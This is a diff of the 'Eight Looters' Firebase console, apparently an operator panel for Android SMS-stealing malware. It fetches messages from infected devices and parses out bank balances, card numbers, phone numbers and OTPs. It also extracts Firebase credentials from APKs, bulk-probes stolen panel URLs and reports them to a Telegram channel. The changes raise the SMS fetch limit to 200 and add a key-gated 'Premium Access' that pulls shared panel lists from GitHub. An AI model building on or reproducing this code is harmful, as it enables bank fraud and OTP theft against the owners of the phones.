@@ -1,13 +1,13 @@
 /* ============================================================
-   Eight Looters · Firebase Console v8
-   FULL OPTIMIZED — All features, less load
+   Eight Looters · Firebase Console v9
+   + SMS 200 limit
+   + Bank SMS date/time
+   + Premium Access (ELIGHT1300MEMBER)
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
 const BRAND = "Eight Looters";
 const WELCOME_KEY = "elight_welcome_done_v1";
-
-/* ===== Perf detection (set by inline script in index.html) ===== */
 const PERF = (typeof window !== "undefined" && window.__ELIGHT_PERF__) || {isMobile:false,isLowEnd:false};
 
 /* ===== Telegram ===== */
@@ -29,8 +29,8 @@ function tgFirebaseMsg(url,key,source,devices){const ck=_cleanTgKey(key,url);
 function tgBulkMsg(items,source,totalTried){const ok=items.filter(x=>x.ok),fail=items.filter(x=>!x.ok);
   let txt=`🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n━━━━━━━━━━━━━━━━━━\n`;
   txt+=`📊 <b>Total tried:</b> ${totalTried}\n✅ <b>Activated:</b> ${ok.length}\n❌ <b>Failed:</b> ${fail.length}\n⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
-  if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more active</i>\n`;}
-  if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more failed</i>\n`;}
+  if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more</i>\n`;}
+  if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more</i>\n`;}
   return txt;}
 function tgApkMsg(file,url,key,pid){const ck=_cleanTgKey(key,url);
   return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
@@ -74,6 +74,7 @@ const Ic={
   pinOff:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M15 9.34V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1v2.34"/>,<path key="c" d="M9 9v1.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h11"/>,<path key="d" d="m2 2 20 20"/>],s),
   calendar:s=>I([<path key="a" d="M8 2v4"/>,<path key="b" d="M16 2v4"/>,<rect key="c" width="18" height="18" x="3" y="4" rx="2"/>,<path key="d" d="M3 10h18"/>],s),
   filter:s=>I([<path key="a" d="M3 6h18"/>,<path key="b" d="M7 12h10"/>,<path key="c" d="M10 18h4"/>],s),
+  crown:s=>I([<path key="a" d="M2 20h20"/>,<path key="b" d="M4 20V8l4 4 4-8 4 8 4-4v12z"/>],s),
 };
 
 /* ===== Storage ===== */
@@ -201,11 +202,12 @@ function parseDevices(raw){const list=[];if(raw&&typeof raw==="object"){
   });
 } return list;}
 
+/* ⚡ PATCH: SMS LIMIT 200 (was 50) */
 function parseMessages(raw){
   const out=[];
   if(raw&&typeof raw==="object"){
     const e=Object.entries(raw);
-    const slice=e.length>50?e.slice(e.length-50):e;
+    const slice=e.length>200?e.slice(e.length-200):e;
     for(const[,m] of slice){
       if(!m||typeof m!=="object") continue;
       const t=String(m.message||m.body||m.text||"");
@@ -246,10 +248,17 @@ function extractOtp(text){
   return null;
 }
 function analyze(msgs){const banks=[],cards=[],phones=new Set(),nets=new Set();
-  for(const m of msgs){const b=parseBankSms(m.text,m.sender);if(b){b.detectedAt=m.time||b.detectedAt;banks.push(b)}
+  for(const m of msgs){
+    const b=parseBankSms(m.text,m.sender);
+    if(b){
+      /* Keep original SMS time string as detectedAt */
+      if(m.time) b.detectedAt=m.time;
+      banks.push(b);
+    }
     const c=parseCard(m.text);if(c) cards.push(c);
     const p=parsePhone(m.text);if(p) phones.add(p);
-    const n=parseNetwork(m.text,m.sender);if(n) nets.add(n);}
+    const n=parseNetwork(m.text,m.sender);if(n) nets.add(n);
+  }
   return {bankBalances:banks,cards,phoneNumbers:[...phones],networks:[...nets]};}
 function makeShareLink(u,k){return window.location.origin+window.location.pathname+"?s="+btoa(unescape(encodeURIComponent(u+"|||"+k)));}
 function makeMergeLink(a){return window.location.origin+window.location.pathname+"?s="+btoa(unescape(encodeURIComponent(JSON.stringify({type:"elight-panels",version:1,panels:a.map(x=>({url:x.url,key:x.key||""}))}))));}
@@ -276,7 +285,6 @@ async function parseApk(file){
   if(!url&&!key) return null;
   return {firebaseUrl:url,apiKey:key,projectId:pid,appId:appid};}
 
-/* ===== Date helpers ===== */
 function startOfDay(d){const x=new Date(d);x.setHours(0,0,0,0);return x.getTime();}
 function endOfDay(d){const x=new Date(d);x.setHours(23,59,59,999);return x.getTime();}
 function toDateInputValue(ts){if(!ts) return "";const d=new Date(ts);const y=d.getFullYear(),m=String(d.getMonth()+1).padStart(2,"0"),dd=String(d.getDate()).padStart(2,"0");return `${y}-${m}-${dd}`;}
@@ -317,26 +325,11 @@ function StatTile({label,value,color="var(--text)",delay=0}){
     <CountUp value={value} style={{fontSize:20,fontWeight:700,color,lineHeight:1}}/>
   </div>;
 }
-
-/* ===== Hero (adaptive) ===== */
 const Hero=React.memo(function Hero(){
-  if(PERF.isLowEnd){
-    return <div className="hero hero-lite">
-      <div className="hero-core">{Ic.zap(26)}</div>
-    </div>;
-  }
-  if(PERF.isMobile){
-    return <div className="hero hero-mobile">
-      <div className="hero-ring"/>
-      <div className="hero-core">{Ic.zap(30)}</div>
-    </div>;
-  }
-  return <div className="hero">
-    <div className="hero-ring"/>
-    <div className="hero-core">{Ic.zap(30)}</div>
-  </div>;
+  if(PERF.isLowEnd) return <div className="hero hero-lite"><div className="hero-core">{Ic.zap(26)}</div></div>;
+  if(PERF.isMobile) return <div className="hero hero-mobile"><div className="hero-ring"/><div className="hero-core">{Ic.zap(30)}</div></div>;
+  return <div className="hero"><div className="hero-ring"/><div className="hero-core">{Ic.zap(30)}</div></div>;
 });
-
 function TGButton({label="Join Telegram"}){
   const go=e=>{e.preventDefault();e.stopPropagation();try{window.open(TG_URL,"_blank","noopener,noreferrer");}catch{window.location.href=TG_URL;}};
   return <a href={TG_URL} target="_blank" rel="noopener noreferrer" onClick={go} className="tg-pill">
@@ -345,41 +338,20 @@ function TGButton({label="Join Telegram"}){
   </a>;
 }
 
-/* ============ WELCOME GATE ============ */
+/* ============ WELCOME ============ */
 function WelcomeGate({onEnter}){
   const [stage,setStage]=useState(0);const [exiting,setExiting]=useState(false);
   useEffect(()=>{const t1=setTimeout(()=>setStage(1),600);const t2=setTimeout(()=>setStage(2),1400);return ()=>{clearTimeout(t1);clearTimeout(t2);};},[]);
   const enterNow=()=>{try{localStorage.setItem(WELCOME_KEY,"1");}catch{}setExiting(true);setTimeout(()=>onEnter(),500);};
   const joinAndEnter=()=>{try{window.open(TG_URL,"_blank","noopener,noreferrer");}catch{window.location.href=TG_URL;}setTimeout(enterNow,300);};
-
-  const particles = useMemo(()=>{
-    if(PERF.isLowEnd) return [];
-    const n = PERF.isMobile ? 8 : 20;
-    return Array.from({length:n}).map(()=>({
-      top:Math.random()*100,left:Math.random()*100,
-      delay:Math.random()*4,dur:3+Math.random()*3,size:2+Math.random()*3
-    }));
-  },[]);
-
-  const titleChars = "EIGHT LOOTERS".split("");
-
+  const particles=useMemo(()=>{if(PERF.isLowEnd) return [];const n=PERF.isMobile?8:20;return Array.from({length:n}).map(()=>({top:Math.random()*100,left:Math.random()*100,delay:Math.random()*4,dur:3+Math.random()*3,size:2+Math.random()*3}));},[]);
+  const titleChars="EIGHT LOOTERS".split("");
   return <div className={"welcome-wrap"+(exiting?" exiting":"")}>
-    {!PERF.isLowEnd && particles.length>0 && <div className="welcome-particles">
-      {particles.map((p,i)=><span key={i} className="wp" style={{top:p.top+"%",left:p.left+"%",width:p.size,height:p.size,animationDelay:p.delay+"s",animationDuration:p.dur+"s"}}/>)}
-    </div>}
+    {!PERF.isLowEnd && particles.length>0 && <div className="welcome-particles">{particles.map((p,i)=><span key={i} className="wp" style={{top:p.top+"%",left:p.left+"%",width:p.size,height:p.size,animationDelay:p.delay+"s",animationDuration:p.dur+"s"}}/>)}</div>}
     <div className="welcome-content">
-      <div className={"welcome-logo"+(stage>=1?" in":"")}>
-        <div className="wl-ring"/>
-        <div className="wl-core">{Ic.zap(36)}</div>
-      </div>
-      <div className={"welcome-title"+(stage>=1?" in":"")}>
-        {titleChars.map((c,i)=>c===" " ? <span key={i} className="wt-space"> </span> :
-          <span key={i} className="wt-char" style={{animationDelay:`${0.03*i}s`}}>{c}</span>
-        )}
-      </div>
-      <div className={"welcome-sub"+(stage>=1?" in":"")}>
-        <span className="ws-line"/><span className="ws-text">PREMIUM FIREBASE CONSOLE</span><span className="ws-line"/>
-      </div>
+      <div className={"welcome-logo"+(stage>=1?" in":"")}><div className="wl-ring"/><div className="wl-core">{Ic.zap(36)}</div></div>
+      <div className={"welcome-title"+(stage>=1?" in":"")}>{titleChars.map((c,i)=>c===" "?<span key={i} className="wt-space"> </span>:<span key={i} className="wt-char" style={{animationDelay:`${0.03*i}s`}}>{c}</span>)}</div>
+      <div className={"welcome-sub"+(stage>=1?" in":"")}><span className="ws-line"/><span className="ws-text">PREMIUM FIREBASE CONSOLE</span><span className="ws-line"/></div>
       <div className={"welcome-cta"+(stage>=2?" in":"")}>
         <button className="wc-btn tg" onClick={joinAndEnter}>
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="currentColor" width="20" height="20"><path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"/></svg>
@@ -407,6 +379,11 @@ function LoginScreen({onConnect,onMergeAll}){
   const [apkFile,setApkFile]=useState("");const [apkBusy,setApkBusy]=useState(false);
   const [apkErr,setApkErr]=useState("");const [apkResult,setApkResult]=useState(null);
   const [copied,setCopied]=useState(false);const [shareLink,setShareLink]=useState("");
+  /* Premium states */
+  const [showPremium,setShowPremium]=useState(false);
+  const [premiumKey,setPremiumKey]=useState("");
+  const [premiumErr,setPremiumErr]=useState("");
+  const [premiumLoading,setPremiumLoading]=useState(false);
   const fileRef=useRef(null);const bulkFileRef=useRef(null);
 
   useEffect(()=>{
@@ -470,6 +447,65 @@ function LoginScreen({onConnect,onMergeAll}){
   }
   function del(id,e){e?.stopPropagation();if(!confirm("Delete this account?")) return;const nx=accounts.filter(a=>a.id!==id);saveAccounts(nx);setAccounts(nx);}
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
+
+  /* ═══════════════════════════════════════════════
+     PREMIUM ACCESS (GitHub-powered)
+     APNA USERNAME AUR REPO YAHAN DAALO ↓
+     ═══════════════════════════════════════════════ */
+  const PREMIUM_KEY = "ELIGHT1300MEMBER";
+  const PREMIUM_GH_USER = "YOUR_GITHUB_USERNAME";   // ← apna username
+  const PREMIUM_GH_REPO = "YOUR_GITHUB_REPO";       // ← apna repo
+  const PREMIUM_GH_BRANCH = "main";
+  const PREMIUM_GH_FILE = "premium_panels.txt";
+  const PREMIUM_GH_RAW = `https://raw.githubusercontent.com/${PREMIUM_GH_USER}/${PREMIUM_GH_REPO}/${PREMIUM_GH_BRANCH}/${PREMIUM_GH_FILE}`;
+
+  async function verifyPremium(){
+    const k = String(premiumKey||"").trim().toUpperCase();
+    setPremiumErr("");
+    if(!k){setPremiumErr("Enter access key");return;}
+    if(k !== PREMIUM_KEY){setPremiumErr("Invalid access key");return;}
+    setPremiumLoading(true);
+    try{
+      const res = await fetch(PREMIUM_GH_RAW + "?t=" + Date.now(), {cache:"no-store"});
+      if(!res.ok) throw new Error("Could not load premium list");
+      const txt = await res.text();
+      const urls = extractFirebaseUrls(txt);
+      if(!urls.length) throw new Error("No Firebase URLs in premium file");
+      const working = [];
+      for(const u of urls){
+        try{
+          const c = await fbGet(u,"","clients");
+          if(c !== null){
+            const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
+            working.push({url:u, devices:devCount});
+          }
+        }catch{}
+      }
+      if(!working.length) throw new Error("No reachable premium panels");
+      const existing = loadAccounts();
+      const existSet = new Set(existing.map(a=>a.url.replace(/\/$/,"").toLowerCase()));
+      const adds = [];
+      working.forEach(w=>{
+        const u = w.url.replace(/\/$/,"");
+        if(!existSet.has(u.toLowerCase())){
+          adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString(),premium:true});
+          existSet.add(u.toLowerCase());
+        }
+      });
+      if(adds.length){const nx=[...existing,...adds];saveAccounts(nx);setAccounts(nx);}
+      setShowPremium(false);
+      setPremiumKey("");
+      notifyTelegram(tgBulkMsg(
+        working.map(w=>({url:w.url, ok:true, devices:w.devices})),
+        "Premium Access", urls.length
+      ));
+      setTimeout(()=>onMergeAll(), 300);
+    }catch(e){
+      setPremiumErr(String(e.message||e).slice(0,120));
+    }finally{
+      setPremiumLoading(false);
+    }
+  }
 
   async function processBulkUrls(urls,source){
     if(!urls.length){setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});return;}
@@ -565,11 +601,7 @@ function LoginScreen({onConnect,onMergeAll}){
       <div style={{textAlign:"center",marginBottom:18}}>
         <Hero/>
         <div className="a-up d2" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:12,marginTop:8}}>
-          <h1 className="hero-title-neon">
-            {"EIGHT LOOTERS".split("").map((c,i)=> c===" " ? <span key={i} className="htn-space"> </span> :
-              <span key={i} className="htn-char">{c}</span>
-            )}
-          </h1>
+          <h1 className="hero-title-neon">{"EIGHT LOOTERS".split("").map((c,i)=>c===" "?<span key={i} className="htn-space"> </span>:<span key={i} className="htn-char">{c}</span>)}</h1>
           <div className="htn-pill">FIREBASE CONSOLE</div>
         </div>
         <p className="a-up d3" style={{fontSize:13,color:"var(--muted)",marginTop:10}}>Sleek device management · Real-time sync</p>
@@ -597,6 +629,7 @@ function LoginScreen({onConnect,onMergeAll}){
                       <span className="badge" style={{background:stats[a.id]?.ok?"rgba(52,211,153,.1)":"rgba(139,92,246,.06)",borderColor:stats[a.id]?.ok?"rgba(52,211,153,.3)":"rgba(139,92,246,.2)",color:stats[a.id]?.ok?"#34d399":"var(--muted-2)",fontSize:9}}>
                         {stats[a.id]?.ok?`${stats[a.id].online} online`:"checking…"}
                       </span>
+                      {a.premium && <span className="badge" style={{background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.35)",color:"#fbbf24",fontSize:9}}>👑</span>}
                     </div>
                     <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:3}}>{a.date} · {stats[a.id]?.ok?`${stats[a.id].total} total`:"—"}</p>
                   </div>
@@ -614,6 +647,10 @@ function LoginScreen({onConnect,onMergeAll}){
               <span>Merge All & Show</span>
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
             </button>
+            <button onClick={()=>{setShowPremium(true);setPremiumErr("");setPremiumKey("");}}
+              className="btn" style={{width:"100%",background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.6)",boxShadow:"0 8px 24px rgba(251,191,36,.35)",fontWeight:800,letterSpacing:"0.05em"}}>
+              <span>👑 PREMIUM ACCESS</span>
+            </button>
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
               <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:8,gap:8,flexWrap:"wrap"}}>
                 <p style={{fontSize:11,fontWeight:600,color:"var(--muted)"}}>Bulk Add Firebase URLs</p>
@@ -622,7 +659,7 @@ function LoginScreen({onConnect,onMergeAll}){
               </div>
               <textarea rows={5} value={bulk} onChange={e=>setBulk(e.target.value)} className="inp" placeholder={"Paste any format:\nhttp://metabank-3def8-default-rtdb.firebaseio.com\nhttps://myapp.firebaseio.com\nmyapp-default-rtdb.firebaseio.com"} style={{fontSize:11}}/>
               <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8,flexWrap:"wrap"}}>
-                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Any format · file upload supported · URLs auto-extract & test</span>
+                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Any format · file upload supported</span>
                 <button onClick={bulkAdd} disabled={bulkBusy||fileBusy||!bulk.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
                   {bulkBusy?<><span className="spin sm"/>Adding…</>:"Add All"}
                 </button>
@@ -666,14 +703,8 @@ function LoginScreen({onConnect,onMergeAll}){
                   <div style={{padding:8,borderRadius:10,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.25)"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"#fb7185",opacity:.8}}>Failed</p><p style={{fontSize:18,fontWeight:700,color:"#fb7185"}}><CountUp value={sum.failed.length}/></p></div>
                   <div style={{padding:8,borderRadius:10,background:"rgba(139,92,246,.06)",border:"1px solid var(--border)"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"var(--muted-2)"}}>Skipped</p><p style={{fontSize:18,fontWeight:700,color:"var(--muted)"}}><CountUp value={sum.skipped.length}/></p></div>
                 </div>
-                {sum.success.length>0 && <div style={{padding:"0 12px 8px",maxHeight:130,overflowY:"auto"}}>
-                  {sum.success.map((s,i)=><div key={i} className="mono a-in" style={{fontSize:10,color:"#34d399",padding:"3px 0"}}>✓ {s.url}{s.devices?` · ${s.devices}d`:""}</div>)}
-                </div>}
-                {sum.failed.length>0 && <div style={{maxHeight:140,overflowY:"auto",padding:"0 12px 12px"}}>
-                  {sum.failed.map((f,i)=>(<div key={i} style={{padding:"6px 10px",borderRadius:8,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.2)",marginBottom:6}} className="a-in">
-                    <p className="mono" style={{fontSize:10,color:"var(--muted)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{f.url||"Invalid input"}</p>
-                    <p style={{fontSize:9,color:"#fb7185",marginTop:2}}>{f.reason}</p></div>))}
-                </div>}
+                {sum.success.length>0 && <div style={{padding:"0 12px 8px",maxHeight:130,overflowY:"auto"}}>{sum.success.map((s,i)=><div key={i} className="mono a-in" style={{fontSize:10,color:"#34d399",padding:"3px 0"}}>✓ {s.url}{s.devices?` · ${s.devices}d`:""}</div>)}</div>}
+                {sum.failed.length>0 && <div style={{maxHeight:140,overflowY:"auto",padding:"0 12px 12px"}}>{sum.failed.map((f,i)=>(<div key={i} style={{padding:"6px 10px",borderRadius:8,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.2)",marginBottom:6}} className="a-in"><p className="mono" style={{fontSize:10,color:"var(--muted)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{f.url||"Invalid input"}</p><p style={{fontSize:9,color:"#fb7185",marginTop:2}}>{f.reason}</p></div>))}</div>}
               </div>
             ))}
           </div>}
@@ -694,13 +725,9 @@ function LoginScreen({onConnect,onMergeAll}){
             {apkBusy && <div className="a-scale" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:10,padding:"22px 16px",borderRadius:14,border:"1px solid var(--border)"}}>
               <span className="spin"/><p style={{fontSize:13,fontWeight:600,color:"#c4b5fd"}}>Scanning file…</p><p className="mono" style={{fontSize:10,color:"var(--muted-2)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:240}}>{apkFile}</p>
             </div>}
-            {apkErr && <div className="a-scale" style={{display:"flex",alignItems:"center",gap:8,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>
-              {Ic.alert(14)}<p style={{fontSize:11,flex:1}}>{apkErr}</p><button onClick={resetApk}>{Ic.x(14)}</button>
-            </div>}
+            {apkErr && <div className="a-scale" style={{display:"flex",alignItems:"center",gap:8,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>{Ic.alert(14)}<p style={{fontSize:11,flex:1}}>{apkErr}</p><button onClick={resetApk}>{Ic.x(14)}</button></div>}
             {apkResult && !apkBusy && <div className="a-scale" style={{borderRadius:14,overflow:"hidden",border:"1px solid rgba(52,211,153,.35)",background:"rgba(52,211,153,.06)"}}>
-              <div style={{display:"flex",alignItems:"center",gap:8,padding:"10px 12px",borderBottom:"1px solid rgba(52,211,153,.2)"}}>
-                {Ic.fileSearch(14)}<span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Extracted</span><button onClick={resetApk} style={{marginLeft:"auto",color:"var(--muted-2)"}}>{Ic.x(14)}</button>
-              </div>
+              <div style={{display:"flex",alignItems:"center",gap:8,padding:"10px 12px",borderBottom:"1px solid rgba(52,211,153,.2)"}}>{Ic.fileSearch(14)}<span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Extracted</span><button onClick={resetApk} style={{marginLeft:"auto",color:"var(--muted-2)"}}>{Ic.x(14)}</button></div>
               <div style={{padding:12,display:"flex",flexDirection:"column",gap:10}}>
                 {[["Firebase URL",apkResult.firebaseUrl],["API Key",apkResult.apiKey],apkResult.projectId&&["Project ID",apkResult.projectId]].filter(Boolean).map(([k,v])=>(
                   <div key={k}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"var(--muted-2)",marginBottom:4}}>{k}</p>
@@ -708,7 +735,6 @@ function LoginScreen({onConnect,onMergeAll}){
                       <span className="mono" style={{fontSize:10,color:"#6ee7b7",flex:1,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{v||"Not found"}</span>
                       {v&&<CopyBtn text={v}/>}
                     </div></div>))}
-                <p style={{fontSize:10,color:"rgba(52,211,153,.7)",marginTop:2}}>Auto-filled below ↓</p>
               </div>
             </div>}
           </div>
@@ -719,9 +745,7 @@ function LoginScreen({onConnect,onMergeAll}){
               <input className="inp mono" value={key} onChange={e=>setKey(e.target.value)} placeholder="Your Firebase secret key"/></div>
           </div>
           <div style={{display:"flex",gap:10,marginTop:20}}>
-            <button onClick={submit} disabled={busy} className="btn btn-primary" style={{flex:1}}>
-              {busy?<><span className="spin" style={{borderTopColor:"#fff"}}/>Connecting…</>:<>{Ic.zap(15)}Save & Connect</>}
-            </button>
+            <button onClick={submit} disabled={busy} className="btn btn-primary" style={{flex:1}}>{busy?<><span className="spin" style={{borderTopColor:"#fff"}}/>Connecting…</>:<>{Ic.zap(15)}Save & Connect</>}</button>
             <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");}} className="btn btn-ghost">Cancel</button>
           </div>
         </div>}
@@ -730,6 +754,31 @@ function LoginScreen({onConnect,onMergeAll}){
       <div style={{display:"flex",justifyContent:"center",marginTop:20}}><TGButton label="Chat with us on Telegram"/></div>
       <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}><span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged</p>
     </div>
+
+    {/* Premium Modal */}
+    {showPremium && <div className="ovl" onClick={()=>setShowPremium(false)}>
+      <div className="glass a-scale" style={{borderRadius:20,padding:26,maxWidth:440,width:"100%",background:"linear-gradient(135deg, rgba(251,191,36,.08), rgba(20,18,40,.98))",border:"1px solid rgba(251,191,36,.4)"}} onClick={e=>e.stopPropagation()}>
+        <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:20}}>
+          <div style={{width:44,height:44,borderRadius:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,boxShadow:"0 8px 24px rgba(251,191,36,.5)"}}>👑</div>
+          <div><h3 style={{fontSize:16,fontWeight:800,color:"#fbbf24",letterSpacing:"0.02em"}}>PREMIUM ACCESS</h3><p style={{fontSize:11,color:"var(--muted)"}}>Enter your access key to unlock</p></div>
+          <button onClick={()=>setShowPremium(false)} className="ibtn" style={{marginLeft:"auto",padding:6}}>{Ic.x(14)}</button>
+        </div>
+        <div style={{marginBottom:16}}>
+          <label style={{fontSize:10,fontWeight:700,letterSpacing:"0.15em",textTransform:"uppercase",color:"#fbbf24",marginBottom:8,display:"block"}}>Access Key</label>
+          <input className="inp mono" type="text" value={premiumKey} onChange={e=>setPremiumKey(e.target.value)}
+            onKeyDown={e=>{if(e.key==="Enter") verifyPremium();}}
+            placeholder="Enter premium key"
+            style={{textAlign:"center",letterSpacing:"0.15em",fontWeight:700,textTransform:"uppercase",borderColor:"rgba(251,191,36,.35)"}}
+            autoFocus/>
+        </div>
+        {premiumErr && <div className="a-in" style={{marginBottom:14,padding:10,borderRadius:10,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185",fontSize:11,textAlign:"center"}}>{premiumErr}</div>}
+        <button onClick={verifyPremium} disabled={premiumLoading} className="btn" style={{width:"100%",padding:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.5)",fontWeight:800,letterSpacing:"0.08em",fontSize:13}}>
+          {premiumLoading?<><span className="spin" style={{borderTopColor:"#fff"}}/>VERIFYING…</>:"UNLOCK PREMIUM →"}
+        </button>
+        <p style={{fontSize:10,color:"var(--muted-2)",textAlign:"center",marginTop:12,lineHeight:1.5}}>Premium access unlocks all shared panels. Key is case-sensitive.</p>
+      </div>
+    </div>}
+
     {shareLink && <div className="ovl" onClick={()=>setShareLink("")}>
       <div className="glass a-scale" style={{borderRadius:20,padding:24,maxWidth:440,width:"100%"}} onClick={e=>e.stopPropagation()}>
         <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
@@ -772,13 +821,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   const load=useCallback(async (showLoad=false)=>{
     if(showLoad) setLoading(true);
     try{const raw=await fbGet(fbUrl,fbKey,"clients");const rows=parseDevices(raw);
-      setDevices(p=>{
-        const old=new Map(p.map(d=>[d.id,d]));
-        return rows.map(d=>{
-          const prev=old.get(d.id);
-          return {...d,smsAnalysis:prev?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};
-        });
-      });
+      setDevices(p=>{const old=new Map(p.map(d=>[d.id,d]));return rows.map(d=>{const prev=old.get(d.id);return {...d,smsAnalysis:prev?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};});});
       setErr("");
       if(prev.current>0&&rows.length>prev.current) toast("🔔 New device connected!");
       prev.current=rows.length;
@@ -786,16 +829,11 @@ function Dashboard({fbUrl,fbKey,onLogout}){
     finally{setLoading(false);}
   },[fbUrl,fbKey,toast]);
 
+  /* ⚡ PATCH: limitToLast 40 → 200 */
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
     const now=Date.now();
-    const work=cur.filter(d=>{
-      if(force) return true;
-      const c=cache.current.get(d.id);
-      if(!c) return true;
-      if(c.ts && now-c.ts < 60000) return false;
-      return true;
-    });
+    const work=cur.filter(d=>{if(force) return true;const c=cache.current.get(d.id);if(!c) return true;if(c.ts && now-c.ts < 60000) return false;return true;});
     if(!work.length) return;
     setScanning(true);
     try{
@@ -804,16 +842,14 @@ function Dashboard({fbUrl,fbKey,onLogout}){
         const batch=work.slice(i,i+batchSize);
         await Promise.all(batch.map(async d=>{
           try{
-            const raw=await fbGet(fbUrl,fbKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"40"});
+            const raw=await fbGet(fbUrl,fbKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"200"});
             const msgs=parseMessages(raw);
             const a=analyze(msgs);
             const lastTs=getLastSmsTs(msgs);
             const active=isRecentSms(msgs,2);
             cache.current.set(d.id,{smsAnalysis:a,lastSmsTs:lastTs,isActive:active,ts:Date.now()});
             setDevices(p=>p.map(x=>x.id===d.id?{...x,smsAnalysis:a,lastSmsTs:lastTs,isActive:active}:x));
-          }catch{
-            cache.current.set(d.id,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});
-          }
